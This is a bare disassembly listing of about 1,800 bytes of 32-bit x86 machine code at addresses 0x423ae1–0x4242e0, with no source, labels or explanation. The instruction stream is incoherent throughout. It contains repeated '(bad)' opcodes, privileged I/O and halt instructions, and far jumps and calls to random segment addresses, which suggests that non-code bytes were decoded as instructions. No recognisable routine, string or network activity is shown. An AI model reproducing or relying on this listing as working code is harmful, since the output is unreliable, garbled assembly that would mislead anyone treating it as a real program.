  423ae1:	cmp    al,0x3a
  423ae3:	lea    edi,[edx]
  423ae5:	(bad)  
  423ae6:	aaa    
  423ae7:	call   0xb0d3:0xec169ead
  423aee:	adc    DWORD PTR [edi],edx
  423af0:	leave  
  423af1:	pushf  
  423af2:	js     0x423ac8
  423af4:	adc    edx,DWORD PTR [ebp+0x6aac781e]
  423afa:	dec    edi
  423afb:	or     dh,BYTE PTR [edi+0x1d257275]
  423b01:	comiss xmm7,DWORD PTR [edx+eiz*4+0x2a]
  423b06:	jecxz  0x423b5d
  423b08:	into   
  423b09:	pushf  
  423b0a:	test   bl,bh
  423b0c:	adc    BYTE PTR [ecx-0x78],ah
  423b0f:	stos   BYTE PTR es:[edi],al
  423b10:	xor    dh,ah
  423b12:	loope  0x423b4c
  423b14:	pop    esi
  423b15:	dec    edi
  423b16:	mov    ds:0x18d757f,eax
  423b1b:	test   BYTE PTR [esi],0x5c
  423b1e:	hlt    
  423b1f:	mov    al,0xce
  423b21:	loope  0x423b9e
  423b23:	rcr    eax,cl
  423b25:	dec    ebp
  423b26:	or     esi,DWORD PTR [esi-0x48251b99]
  423b2c:	nop
  423b2d:	test   DWORD PTR [eax],ecx
  423b2f:	scas   eax,DWORD PTR es:[edi]
  423b30:	push   ecx
  423b31:	xor    BYTE PTR [ecx+0x40],ch
  423b34:	mov    DWORD PTR [edi+0x62],ebx
  423b37:	pop    esp
  423b38:	sbb    ebx,DWORD PTR [esi+0x15]
  423b3b:	jno    0x423af8
  423b3d:	adc    dh,BYTE PTR [edx+ebx*4-0x2a9bb26c]
  423b44:	cmp    eax,0xea4650b3
  423b49:	mov    dl,0x4a
  423b4b:	bound  esi,QWORD PTR [ebp+0x40d68963]
  423b51:	inc    esp
  423b52:	int    0x4d
  423b54:	mov    BYTE PTR [edi],bl
  423b56:	xchg   esi,eax
  423b57:	jp     0x423bc9
  423b59:	jge    0x423bc6
  423b5b:	xchg   edx,eax
  423b5c:	pusha  
  423b5d:	ja     0x423b8b
  423b5f:	in     eax,dx
  423b60:	or     eax,0x3c620dfd
  423b65:	jmp    0xe1ea10d1
  423b6a:	mov    al,ds:0x9bbe30fa
  423b6f:	adc    eax,0xba4f6201
  423b74:	test   al,0xa0
  423b76:	lea    esi,[ebx]
  423b78:	push   ds
  423b79:	enter  0x716e,0x7a
  423b7d:	arpl   WORD PTR [edx+edi*8+0x20],si
  423b81:	inc    edi
  423b82:	mov    bh,0xec
  423b84:	and    al,0x20
  423b86:	or     dh,al
  423b88:	jl     0x423bf4
  423b8a:	sti    
  423b8b:	sub    al,0xa5
  423b8d:	sti    
  423b8e:	mov    esi,0x2437d2d6
  423b93:	imul   edx,esi,0x70b8e983
  423b99:	sbb    al,0xbc
  423b9b:	jmp    edi
  423b9d:	sub    eax,0x7ba6f191
  423ba2:	pop    ss
  423ba3:	add    BYTE PTR [eax-0x3e],bh
  423ba6:	add    eax,DWORD PTR [ecx+0x2cc05257]
  423bac:	and    bh,dh
  423bae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423baf:	jle    0x423b4b
  423bb1:	or     edi,esi
  423bb3:	cs iret 
  423bb5:	mov    cl,0xcf
  423bb7:	xor    eax,0xb5542a05
  423bbc:	inc    BYTE PTR [ebx+0x46]
  423bbf:	push   esp
  423bc0:	pushf  
  423bc1:	shr    DWORD PTR [ebp-0x13c5ecb2],cl
  423bc7:	pop    ebx
  423bc8:	mov    edx,DWORD PTR [eax+eiz*8+0x58bfb351]
  423bcf:	(bad)  
  423bd0:	repnz adc eax,0x8a25a8bb
  423bd6:	cmp    DWORD PTR [edi],edx
  423bd8:	push   esp
  423bd9:	mov    esi,0x7ac69592
  423bde:	fld    QWORD PTR [edx+eax*8-0x1f]
  423be2:	mov    ah,0x30
  423be4:	(bad)  
  423be5:	jno    0x423c33
  423be7:	mov    edi,cs
  423be9:	mov    al,ds:0xdf6d351f
  423bee:	pop    eax
  423bef:	and    al,BYTE PTR [esi+0x4b194ab8]
  423bf5:	lea    edx,[ebx]
  423bf7:	jmp    0x423ba1
  423bf9:	jae    0x423c6f
  423bfb:	inc    eax
  423bfc:	leave  
  423bfd:	and    dh,BYTE PTR [edx-0x6c]
  423c00:	add    al,0x43
  423c02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c03:	test   al,0x49
  423c05:	push   0x4ff80938
  423c0a:	cli    
  423c0b:	jle    0x423c8b
  423c0d:	call   0xeef1:0xf06bb9aa
  423c14:	dec    ebp
  423c15:	sub    ebp,DWORD PTR [ebp+0x40]
  423c18:	mov    ecx,0xee32f827
  423c1d:	gs jp  0x423c94
  423c20:	enter  0x93ce,0xeb
  423c24:	gs ins DWORD PTR es:[edi],dx
  423c26:	add    eax,0xba901c06
  423c2b:	pop    edi
  423c2c:	clc    
  423c2d:	push   0xffffffcf
  423c2f:	in     eax,0xd1
  423c31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423c32:	xchg   ecx,eax
  423c33:	sbb    al,0x58
  423c35:	test   BYTE PTR [ecx+0x35],0xa3
  423c39:	pop    edi
  423c3a:	xchg   ecx,eax
  423c3b:	sbb    ah,dh
  423c3d:	add    eax,0x119b4620
  423c42:	inc    esp
  423c43:	inc    esp
  423c44:	or     bh,dh
  423c46:	inc    esp
  423c47:	loope  0x423bdf
  423c49:	cdq    
  423c4a:	and    eax,0x6934502d
  423c4f:	retf   
  423c50:	inc    ebx
  423c51:	pushf  
  423c52:	xor    DWORD PTR [esi-0x76a4339d],0x59
  423c59:	push   cs
  423c5a:	push   es
  423c5b:	or     DWORD PTR [ebp+0x44],edx
  423c5e:	pop    esi
  423c5f:	std    
  423c60:	pop    ecx
  423c61:	nop
  423c62:	in     eax,0xd6
  423c64:	mov    dh,0xa9
  423c66:	icebp  
  423c67:	jbe    0x423c6f
  423c69:	adc    al,0xff
  423c6b:	nop
  423c6c:	retf   0x9848
  423c6f:	mov    dh,0x4b
  423c71:	pusha  
  423c72:	push   edx
  423c73:	in     eax,0xe7
  423c75:	loopne 0x423c2f
  423c77:	cmp    ch,ch
  423c79:	jns    0x423c87
  423c7b:	cmp    al,0x27
  423c7d:	sbb    al,0xee
  423c7f:	mov    esi,edi
  423c81:	mov    DWORD PTR [edi],esp
  423c83:	std    
  423c84:	sub    al,0x3f
  423c86:	or     BYTE PTR [ecx-0x133d0560],bh
  423c8c:	and    DWORD PTR [esi],ebx
  423c8e:	call   0x901bcb7d
  423c93:	xor    eax,0x14dadbec
  423c98:	adc    eax,0x314b811a
  423c9d:	add    cl,cl
  423c9f:	xchg   ebx,eax
  423ca0:	out    0xe1,eax
  423ca2:	jno    0x423cfc
  423ca4:	dec    eax
  423ca5:	mov    cl,0xa0
  423ca7:	pop    ebp
  423ca8:	sub    edi,DWORD PTR [ecx+0x5347dca0]
  423cae:	add    al,0x59
  423cb0:	cli    
  423cb1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423cb2:	mov    eax,ds:0xc3b2cc7f
  423cb7:	es adc al,0xeb
  423cba:	xchg   ebx,eax
  423cbb:	push   cs
  423cbc:	mov    ebx,0x43ed1761
  423cc1:	div    al
  423cc3:	sbb    esi,DWORD PTR [ecx]
  423cc5:	adc    eax,0xd749b8e5
  423cca:	fisttp DWORD PTR [esi]
  423ccc:	mov    ch,0x40
  423cce:	push   0x68
  423cd0:	je     0x423cdb
  423cd2:	mov    ch,0x53
  423cd4:	add    BYTE PTR [edx*4-0x43817bf8],ch
  423cdb:	dec    esi
  423cdc:	mov    ebp,0x99d83d01
  423ce1:	mov    ds:0x204696d6,eax
  423ce6:	out    0xa3,al
  423ce8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423ce9:	and    al,0x44
  423ceb:	fmul   QWORD PTR [ebx]
  423ced:	shl    DWORD PTR [ebx-0x1],cl
  423cf0:	ja     0x423c9b
  423cf2:	mov    dl,bh
  423cf4:	add    al,0xd3
  423cf6:	hlt    
  423cf7:	push   edx
  423cf8:	cmp    esp,0x13acf13a
  423cfe:	ins    BYTE PTR es:[edi],dx
  423cff:	mov    edi,0x7dc4a260
  423d04:	ret    
  423d05:	adc    al,0x7f
  423d07:	or     eax,0xf91404d4
  423d0c:	arpl   WORD PTR [ebp+0x12b3a7cd],bp
  423d12:	lea    ecx,[ebx-0x72]
  423d15:	sti    
  423d16:	jns    0x423d8b
  423d18:	dec    ebx
  423d19:	lock pusha 
  423d1b:	in     eax,0xf7
  423d1d:	mov    ecx,DWORD PTR [esp+ecx*4+0x3d175e24]
  423d24:	inc    esp
  423d25:	push   0x68
  423d27:	nop
  423d28:	adc    BYTE PTR [edi+0x7c],al
  423d2b:	mov    cl,0x1c
  423d2d:	(bad)  [edi]
  423d2f:	push   0x13
  423d31:	sub    ch,BYTE PTR [edx+ebp*8]
  423d34:	pop    eax
  423d35:	push   ss
  423d36:	retf   0xc7e0
  423d39:	test   BYTE PTR [esi],bl
  423d3b:	in     eax,0xad
  423d3d:	and    al,0x53
  423d3f:	call   0xee560a4d
  423d44:	jae    0x423cdf
  423d46:	daa    
  423d47:	dec    edx
  423d48:	and    ch,BYTE PTR [esi]
  423d4a:	mov    al,ds:0xdf894e5d
  423d4f:	hlt    
  423d50:	sub    ebp,edi
  423d52:	jae    0x423d00
  423d54:	in     al,0xcc
  423d56:	add    eax,esp
  423d58:	pop    edx
  423d59:	mov    dl,0x18
  423d5b:	arpl   cx,si
  423d5d:	ins    BYTE PTR es:[edi],dx
  423d5e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d5f:	mov    edi,0xf2bd51d4
  423d64:	les    ebp,FWORD PTR [ecx+0x8cc0b95]
  423d6a:	fs das 
  423d6c:	aas    
  423d6d:	ret    
  423d6e:	ss add ebx,eax
  423d71:	mov    dl,0x6a
  423d73:	iret   
  423d74:	mov    dl,0x72
  423d76:	mov    BYTE PTR [edx],0xad
  423d79:	mov    dl,BYTE PTR [edi]
  423d7b:	aas    
  423d7c:	add    ecx,DWORD PTR [esi]
  423d7e:	popa   
  423d7f:	sbb    al,0xd8
  423d81:	or     eax,0x33750f4
  423d86:	dec    edi
  423d87:	cmp    eax,0xdb082845
  423d8c:	sub    esi,DWORD PTR [edi]
  423d8e:	inc    esp
  423d8f:	cdq    
  423d90:	add    esi,0x70d532a3
  423d96:	lods   eax,DWORD PTR ds:[esi]
  423d97:	aas    
  423d98:	idiv   DWORD PTR [esi-0x1d6227cc]
  423d9e:	mov    eax,ss:0x723b73ea
  423da4:	aad    0xeb
  423da6:	sbb    DWORD PTR [edx-0x6d],edx
  423da9:	sub    DWORD PTR [eax+0x4f],edi
  423dac:	push   eax
  423dad:	push   ebx
  423dae:	jo     0x423d7e
  423db0:	ss cld 
  423db2:	cmp    BYTE PTR [eax-0x6f],0xe8
  423db6:	int    0x59
  423db8:	jae    0x423da7
  423dba:	outs   dx,DWORD PTR ds:[esi]
  423dbb:	pushf  
  423dbc:	in     eax,dx
  423dbd:	fbld   TBYTE PTR [ebx]
  423dbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423dc0:	pop    ss
  423dc1:	aas    
  423dc2:	adc    eax,0xc00f5946
  423dc7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423dc8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423dc9:	or     cl,dl
  423dcb:	push   0xb73f75ec
  423dd0:	pop    esp
  423dd1:	pop    eax
  423dd2:	xchg   esi,eax
  423dd3:	mov    edi,0xdf279690
  423dd8:	call   0xa934801e
  423ddd:	div    BYTE PTR [edi-0x4c]
  423de0:	jae    0x423dff
  423de2:	jecxz  0x423e25
  423de4:	mov    ah,0xec
  423de6:	and    DWORD PTR [edi],edx
  423de8:	repnz xlat BYTE PTR ds:[ebx]
  423dea:	(bad)  
  423deb:	aad    0xc6
  423ded:	dec    edi
  423dee:	jae    0x423da4
  423df0:	in     al,dx
  423df1:	mov    cl,0xe7
  423df3:	pop    ds
  423df4:	push   ebx
  423df5:	add    BYTE PTR ds:[edi+0x272c52b4],cl
  423dfc:	call   0xa3d56ae6
  423e01:	mov    al,0xc2
  423e03:	sbb    BYTE PTR ds:0x82a5032,0xfc
  423e0a:	jp     0x423e1b
  423e0c:	inc    esi
  423e0d:	push   eax
  423e0e:	scas   al,BYTE PTR es:[edi]
  423e0f:	jno    0x423dfd
  423e11:	fsub   QWORD PTR ds:0xae33bc85
  423e17:	xchg   BYTE PTR [edi+0xd],bh
  423e1a:	adc    ecx,DWORD PTR [edi+0x757ffff1]
  423e20:	aam    0xfe
  423e22:	cld    
  423e23:	cmp    ch,BYTE PTR [esi]
  423e25:	mov    edi,0x9c19f2
  423e2a:	test   eax,0xc7a7a05c
  423e2f:	xchg   esp,eax
  423e30:	and    DWORD PTR [ebx-0x67c861bf],edx
  423e36:	dec    esp
  423e37:	jmp    0x423e33
  423e39:	sub    DWORD PTR [edx+0x2661830a],ebp
  423e3f:	cdq    
  423e40:	xor    eax,0x50dc0513
  423e45:	sbb    eax,0x3b1b4c95
  423e4a:	inc    ebp
  423e4b:	adc    eax,0xf1a4c076
  423e50:	(bad)  
  423e51:	or     BYTE PTR [edi-0x74b9f417],cl
  423e57:	fcom   st(3)
  423e59:	loopne 0x423e49
  423e5b:	pop    esp
  423e5c:	sbb    edx,esi
  423e5e:	imul   eax,ebx,0x66e144b7
  423e64:	imul   ebx,DWORD PTR [ebx+0x15],0xbe4cae04
  423e6b:	das    
  423e6c:	pop    edx
  423e6d:	xor    DWORD PTR [ebx],edx
  423e6f:	and    bl,al
  423e71:	inc    esp
  423e72:	mov    ecx,0xb7892e07
  423e77:	outs   dx,BYTE PTR ds:[esi]
  423e78:	(bad)  
  423e79:	mov    cl,BYTE PTR [ebp-0x3b]
  423e7c:	das    
  423e7d:	dec    esp
  423e7e:	pop    esp
  423e7f:	cli    
  423e80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423e81:	cmp    BYTE PTR [esi+0xe],cl
  423e84:	in     eax,0xd4
  423e86:	push   edi
  423e87:	sbb    dl,BYTE PTR [ebx+0x2b6b6861]
  423e8d:	(bad)  
  423e8e:	in     eax,dx
  423e8f:	mov    ch,0xcc
  423e91:	imul   DWORD PTR [esi-0x60]
  423e94:	retf   
  423e95:	mov    al,ds:0x2711d984
  423e9a:	mov    cl,0xa9
  423e9c:	js     0x423ec8
  423e9e:	fld    QWORD PTR [edi+ebx*2+0xfdefb4c]
  423ea5:	gs ja  0x423e8c
  423ea8:	aad    0x96
  423eaa:	xchg   ebp,eax
  423eab:	dec    ecx
  423eac:	inc    eax
  423ead:	jae    0x423eeb
  423eaf:	push   cs
  423eb0:	mov    es,WORD PTR [edx+0x54]
  423eb3:	inc    edi
  423eb4:	leave  
  423eb5:	cmp    ebx,DWORD PTR [ebx+eiz*4+0x29123b9c]
  423ebc:	scas   eax,DWORD PTR es:[edi]
  423ebd:	mov    dh,0x64
  423ebf:	add    BYTE PTR [edi],dh
  423ec1:	leave  
  423ec2:	or     BYTE PTR [eax+0x65d4dd40],dl
  423ec8:	lea    ebx,[ebp-0x46]
  423ecb:	data16 fild DWORD PTR ds:0x60a5761d
  423ed2:	jns    0x423f3a
  423ed4:	(bad)  
  423ed6:	pop    eax
  423ed7:	push   ds
  423ed8:	xor    ebx,DWORD PTR [edi]
  423eda:	test   DWORD PTR [eax-0x54],edi
  423edd:	aad    0xc2
  423edf:	les    ecx,FWORD PTR [esi+0x37]
  423ee2:	or     bh,ah
  423ee4:	cdq    
  423ee5:	jecxz  0x423e93
  423ee7:	sbb    ebp,DWORD PTR [ecx+0x421f7f79]
  423eed:	pop    ecx
  423eee:	add    eax,0x25235cae
  423ef3:	(bad)  
  423ef5:	daa    
  423ef6:	mov    ds:0xa744f5e,eax
  423efb:	sbb    eax,0xe8d854f1
  423f00:	data16 cld 
  423f02:	dec    ebp
  423f03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423f04:	sahf   
  423f05:	mov    edx,0xafa2df01
  423f0a:	outs   dx,DWORD PTR ds:[esi]
  423f0b:	retf   
  423f0c:	gs test bl,ah
  423f0f:	ficomp DWORD PTR ds:0x67abf34b
  423f15:	fldenv [ecx+edi*8]
  423f18:	sub    DWORD PTR [eax],esp
  423f1a:	sbb    BYTE PTR [ebp+0x544be873],dh
  423f20:	jo     0x423ed1
  423f22:	xor    eax,0xcc9e3d5
  423f27:	ins    DWORD PTR es:[edi],dx
  423f28:	in     eax,dx
  423f29:	mov    dl,0x57
  423f2b:	mov    eax,edi
  423f2d:	sub    BYTE PTR [esi],cl
  423f2f:	or     eax,0x677720f6
  423f34:	or     BYTE PTR [ebp+ecx*8-0x3172fcb5],ch
  423f3b:	test   eax,0xc1a375ca
  423f40:	pop    esi
  423f41:	loopne 0x423fbb
  423f43:	xor    DWORD PTR [esp+ebx*8+0x35804373],ecx
  423f4a:	mov    edi,0xb2886431
  423f4f:	jle    0x423f94
  423f51:	inc    edx
  423f52:	cmp    BYTE PTR [eax+0x42],dh
  423f55:	out    0xa4,al
  423f57:	scas   eax,DWORD PTR es:[edi]
  423f58:	call   0x26aa:0xbf548de6
  423f5f:	push   ebx
  423f60:	repnz adc eax,0xc4e0f4a7
  423f66:	jmp    0xeb542c68
  423f6b:	cld    
  423f6c:	jl     0x423fa1
  423f6e:	ins    BYTE PTR es:[edi],dx
  423f6f:	lods   eax,DWORD PTR ds:[esi]
  423f70:	dec    ebp
  423f71:	fs push edi
  423f73:	ins    BYTE PTR es:[edi],dx
  423f74:	adc    ebx,DWORD PTR [eax+ecx*8+0xbc275e7]
  423f7b:	cmp    DWORD PTR [eax],eax
  423f7d:	pop    edi
  423f7e:	and    eax,0x48cb585c
  423f83:	inc    ecx
  423f84:	pop    esp
  423f85:	push   ebp
  423f86:	xor    eax,0xd70bd3de
  423f8b:	sahf   
  423f8c:	mov    DWORD PTR [edi],esi
  423f8e:	aam    0x25
  423f90:	push   edx
  423f91:	push   esi
  423f92:	les    ecx,FWORD PTR [ebx-0x3f37c7a9]
  423f98:	or     al,BYTE PTR [ecx+eiz*1+0x46]
  423f9c:	xchg   DWORD PTR [ecx],edx
  423f9e:	ret    0xdace
  423fa1:	test   al,0xbd
  423fa3:	test   al,0x53
  423fa5:	add    DWORD PTR [esi+eax*2],eax
  423fa8:	and    BYTE PTR [edx+0x68],0x5a
  423fac:	rol    BYTE PTR gs:[edi+eax*1-0x2e6c2ffe],1
  423fb4:	sbb    ah,bl
  423fb6:	(bad)  
  423fb8:	push   es
  423fb9:	enter  0xefef,0xed
  423fbd:	pop    edi
  423fbe:	mov    al,0xb3
  423fc0:	add    al,0x35
  423fc2:	mov    eax,ds:0x24f0208f
  423fc7:	xor    bh,0x52
  423fca:	push   esp
  423fcb:	stos   DWORD PTR es:[edi],eax
  423fcc:	enter  0xbcc5,0x9
  423fd0:	(bad)  
  423fd1:	(bad)  
  423fd2:	loop   0x424051
  423fd4:	daa    
  423fd5:	iret   
  423fd6:	add    dh,BYTE PTR [edx-0x2f]
  423fd9:	je     0x423f7e
  423fdb:	loope  0x424003
  423fdd:	pop    ebp
  423fde:	cdq    
  423fdf:	jmp    0x423f69
  423fe1:	xor    DWORD PTR [ecx+eax*1-0x2172ec48],edi
  423fe8:	sbb    ch,0x3
  423feb:	dec    ebp
  423fec:	pop    es
  423fed:	pop    edi
  423fee:	les    esp,FWORD PTR [esi]
  423ff0:	cli    
  423ff1:	sbb    ecx,DWORD PTR [ebp-0x6cfce7a]
  423ff7:	ins    DWORD PTR es:[edi],dx
  423ff8:	xchg   edx,eax
  423ff9:	sub    BYTE PTR [esi+0x4f0c191d],bh
  423fff:	mov    cs,WORD PTR [edi-0x71da5e11]
  424005:	ins    BYTE PTR es:[edi],dx
  424006:	xor    eax,0x494fb5b5
  42400b:	bound  edx,QWORD PTR [edx+0x42]
  42400e:	mov    esp,0xe0966ae7
  424013:	int    0x27
  424015:	cli    
  424016:	push   ebx
  424017:	push   es
  424018:	fdiv   DWORD PTR [eax-0x37]
  42401b:	mov    ds:0xc0a5dac1,eax
  424020:	out    0xed,eax
  424022:	and    eax,DWORD PTR [ebx]
  424024:	in     al,dx
  424025:	enter  0xd94,0x18
  424029:	aaa    
  42402a:	mov    ah,0x3d
  42402c:	pop    eax
  42402d:	test   DWORD PTR [esi],eax
  42402f:	mov    bh,0xec
  424031:	jmp    0x9850:0x11ceb6ee
  424038:	(bad)  
  424039:	push   0xffffffcb
  42403b:	fdiv   QWORD PTR [ebx+0x4506bdbd]
  424041:	pop    ebx
  424042:	xchg   ebp,eax
  424043:	inc    esp
  424044:	scas   eax,DWORD PTR es:[edi]
  424045:	sub    BYTE PTR [esi],ah
  424047:	dec    esi
  424048:	nop
  424049:	cmp    DWORD PTR [edi+0x6f],ebp
  42404c:	mov    al,0x4f
  42404e:	ds test bl,cl
  424051:	sub    cl,BYTE PTR [esi+0x9447865]
  424057:	inc    ebp
  424058:	push   ecx
  424059:	je     0x424036
  42405b:	nop
  42405c:	mov    WORD PTR [ecx],fs
  42405e:	push   ebx
  42405f:	push   ds
  424060:	imul   ecx,DWORD PTR [ebx+0x41ed13fe],0xd0ab40f4
  42406a:	frstor [edx+0xa]
  42406d:	push   esp
  42406e:	cmc    
  42406f:	xchg   ecx,eax
  424070:	mov    esi,0x53dd592d
  424075:	in     al,dx
  424076:	sub    DWORD PTR [ecx+0x6f],0x5c
  42407a:	out    0x2,eax
  42407c:	mov    esp,0x470aa943
  424081:	mov    ebx,0xa0af1e17
  424086:	shl    DWORD PTR [ecx+0x5ac1093a],0x92
  42408d:	mov    edx,0xbe7a6f35
  424092:	fiadd  DWORD PTR fs:[edx]
  424095:	arpl   WORD PTR [esi+0x46ceda7a],di
  42409b:	iret   
  42409c:	inc    esp
  42409d:	mov    esp,0x6f9e694c
  4240a2:	sbb    ebp,DWORD PTR [edx+0x76]
  4240a5:	popa   
  4240a6:	adc    BYTE PTR [edx-0x49],dl
  4240a9:	(bad)
  4240ac:	pop    ebx
  4240ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4240ae:	push   ebp
  4240af:	jmp    0x730c:0x89f52ae
  4240b6:	gs add al,0xb3
  4240b9:	test   BYTE PTR [edx+0x68b9128b],dl
  4240bf:	push   edx
  4240c0:	repz popa 
  4240c2:	repnz dec esi
  4240c4:	xchg   edx,eax
  4240c5:	and    al,cl
  4240c7:	in     al,dx
  4240c8:	repnz sub BYTE PTR [esi-0x279a6cde],dh
  4240cf:	mov    esi,0xc1373d6e
  4240d4:	retf   
  4240d5:	adc    al,0x84
  4240d7:	or     eax,0x1bd8d62
  4240dc:	shl    DWORD PTR ds:0xc862159a,0xeb
  4240e3:	jbe    0x424115
  4240e5:	mov    ebp,0xf7967d33
  4240ea:	sub    eax,0x3548c32b
  4240ef:	leave  
  4240f0:	imul   esi,DWORD PTR [ecx],0xffffffb0
  4240f3:	xchg   esp,eax
  4240f4:	xor    bl,cl
  4240f6:	mov    ch,0x78
  4240f8:	or     al,0x39
  4240fa:	adc    al,0x79
  4240fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4240fd:	outs   dx,DWORD PTR ds:[esi]
  4240fe:	jne    0x4240e6
  424100:	mov    ds:0xf7c19380,al
  424105:	(bad)  
  424106:	int    0x3
  424108:	stc    
  424109:	cmp    dh,al
  42410b:	fcmovb st,st(2)
  42410d:	out    0x47,al
  42410f:	sbb    edx,ecx
  424111:	inc    edi
  424112:	and    DWORD PTR [edx+0x73],esi
  424115:	in     eax,0x67
  424117:	jp     0x424174
  424119:	push   edi
  42411a:	jb     0x424145
  42411c:	les    esp,FWORD PTR [ecx-0x1a]
  42411f:	sar    ebx,1
  424121:	repnz cs out dx,eax
  424124:	fsub   QWORD PTR [ecx+0x19]
  424128:	jbe    0x42415b
  42412a:	imul   eax,DWORD PTR [ecx],0xfbaabda7
  424130:	adc    dl,BYTE PTR [edi-0x15]
  424133:	mov    eax,ds:0xfee99e59
  424138:	je     0x4240c8
  42413a:	mov    ax,ds:0x38f2608a
  424140:	fidivr DWORD PTR ds:0x89ed455
  424146:	sub    eax,0x5c9263af
  42414b:	sbb    eax,0xc3b50fd
  424150:	out    dx,eax
  424151:	sti    
  424152:	mov    eax,ds:0xbe3678a1
  424157:	push   DWORD PTR [edx-0x20]
  42415a:	lock sub DWORD PTR [edi+0xe3734b8],esi
  424161:	adc    ebx,DWORD PTR [edx-0x15]
  424164:	mov    ecx,0xaa80fe61
  424169:	jnp    0x4241d7
  42416b:	fwait
  42416c:	and    bl,bh
  42416e:	adc    bh,BYTE PTR [ebp-0x3e82ea0b]
  424174:	inc    ecx
  424175:	push   ds
  424176:	mov    ah,BYTE PTR [ecx-0xb]
  424179:	rcr    BYTE PTR [ebx+0x62677e9d],cl
  42417f:	lods   al,BYTE PTR ds:[esi]
  424180:	add    DWORD PTR [ebx],0x15cd99b8
  424186:	in     eax,dx
  424187:	jmp    0xb1e0ee52
  42418c:	imul   ecx,eax,0x73
  42418f:	shl    ch,1
  424191:	scas   eax,DWORD PTR es:[edi]
  424192:	aad    0x8
  424194:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424195:	mov    eax,0xf10cc53b
  42419a:	push   ecx
  42419b:	and    DWORD PTR [eax+0x4e3ba782],esp
  4241a1:	or     BYTE PTR [eax+0x77379303],dl
  4241a7:	xchg   ebp,eax
  4241a8:	sbb    ch,BYTE PTR [edi]
  4241aa:	sar    DWORD PTR [ecx+0x50de2175],1
  4241b0:	jmp    0x42419c
  4241b2:	out    dx,eax
  4241b3:	inc    esp
  4241b4:	mov    bl,0xee
  4241b6:	or     BYTE PTR [esi],bl
  4241b8:	in     eax,dx
  4241b9:	ror    BYTE PTR [eax+0x1b],cl
  4241bc:	fwait
  4241bd:	cmp    DWORD PTR [edi+0x3bfb5449],edi
  4241c3:	dec    edx
  4241c4:	scas   eax,DWORD PTR es:[edi]
  4241c5:	in     al,0x5
  4241c7:	fdiv   QWORD PTR [esi-0xe]
  4241ca:	push   ebp
  4241cb:	ror    BYTE PTR [esi-0x116c63ad],0xaa
  4241d2:	xor    esi,DWORD PTR [eax]
  4241d4:	add    edi,edi
  4241d6:	test   BYTE PTR [ebx],0xe4
  4241d9:	ficomp DWORD PTR [eax]
  4241db:	inc    ecx
  4241dc:	adc    ch,al
  4241de:	clc    
  4241df:	repz mov eax,ss:0x3096d1c3
  4241e6:	aaa    
  4241e7:	jmp    0x4241aa
  4241e9:	lds    edx,FWORD PTR [ebp-0x32e4197c]
  4241ef:	sbb    cl,al
  4241f1:	ds adc al,0x93
  4241f4:	mov    ebx,0x2c01a07b
  4241f9:	xchg   esp,eax
  4241fa:	or     eax,0x623b039a
  4241ff:	mov    ecx,0xd44059a0
  424204:	aad    0x7d
  424206:	jo     0x4241e9
  424208:	mov    al,0x8d
  42420a:	ror    bh,1
  42420c:	pop    edx
  42420d:	mov    bh,0x9
  42420f:	push   eax
  424210:	or     eax,0x19b0449e
  424215:	jmp    0x424236
  424217:	mov    ah,0xbd
  424219:	adc    BYTE PTR [edx-0xa],dl
  42421c:	add    edi,DWORD PTR [edi+0x6cbe8539]
  424222:	mov    esp,0x5bb44227
  424227:	pop    ds
  424228:	retf   
  424229:	leave  
  42422a:	xchg   DWORD PTR [edx-0x7f],esp
  42422d:	icebp  
  42422e:	pushf  
  42422f:	mov    eax,ds:0xccbf7146
  424234:	shl    BYTE PTR ds:0xd04894fa,cl
  42423a:	inc    edi
  42423b:	jno    0x424262
  42423d:	bnd jge 0x424233
  424240:	jp     0x4242b2
  424242:	add    al,0xf9
  424244:	ins    BYTE PTR es:[edi],dx
  424245:	and    eax,0x9d3af92f
  42424a:	call   0x8e4d:0x7ed194dc
  424251:	or     eax,0xa22979ac
  424256:	add    eax,0x7bb9fd4
  42425b:	push   ebx
  42425c:	mov    ds:0xb28f877a,eax
  424261:	dec    ecx
  424262:	loope  0x424244
  424264:	dec    esp
  424265:	xchg   ebx,eax
  424266:	push   esp
  424267:	add    BYTE PTR [ecx],bl
  424269:	mov    ch,0x51
  42426b:	jae    0x4241fc
  42426d:	xchg   ebp,eax
  42426e:	(bad)  
  42426f:	dec    esi
  424270:	pusha  
  424271:	and    al,0x63
  424273:	dec    edi
  424274:	lea    ebp,[ecx-0x31d91c6c]
  42427a:	mov    edx,0xa1ba622b
  42427f:	push   es
  424280:	into   
  424281:	int3   
  424282:	shr    DWORD PTR [eax-0x63],cl
  424285:	test   DWORD PTR [edi-0x31],eax
  424288:	imul   esp,DWORD PTR [ecx+esi*8+0x2206dbb8],0x3a4ff00b
  424293:	mov    edi,eax
  424295:	in     eax,dx
  424296:	push   ds
  424297:	mov    edx,0x82edf672
  42429c:	rcl    DWORD PTR [edx],1
  42429e:	repz sbb eax,0x52d562a2
  4242a4:	xor    dh,bh
  4242a6:	xor    al,0x50
  4242a8:	pusha  
  4242a9:	mov    ebp,0x2067a67b
  4242ae:	add    bl,BYTE PTR [ecx+0x52]
  4242b1:	das    
  4242b2:	das    
  4242b3:	xor    BYTE PTR [eax],0x9a
  4242b6:	or     DWORD PTR [edi-0x6f26b588],esp
  4242bc:	dec    esp
  4242bd:	enter  0x8042,0x78
  4242c1:	shl    BYTE PTR [ebp-0x12],0xc1
  4242c5:	jns    0x4242ec
  4242c7:	xchg   ebp,eax
  4242c8:	jmp    0xfab8:0x81005b09
  4242cf:	adc    BYTE PTR [ecx+0x67cde97e],cl
  4242d5:	mov    bh,0x7e
  4242d7:	xor    BYTE PTR [edi],0x84
  4242da:	cmc    
  4242db:	ror    BYTE PTR [edx-0x1b],0x62
  4242df:	xchg   ebx,eax
  4242e0:	mov    ah,0x4d
